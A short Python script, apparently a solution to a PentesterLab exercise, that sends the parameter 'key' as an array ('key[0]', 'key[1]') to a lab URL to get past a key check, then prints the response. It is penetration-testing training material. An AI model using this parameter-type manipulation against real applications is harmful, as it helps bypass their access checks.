#!/usr/bin/env python3

import requests

url = 'http://ptl-7a295c2b-541712f9.libcurl.so/pentesterlab'
params = {"key[0]":"key","key[1]":"please"}

r = requests.get(url,params=params)
print(r.url)
print(r.text)

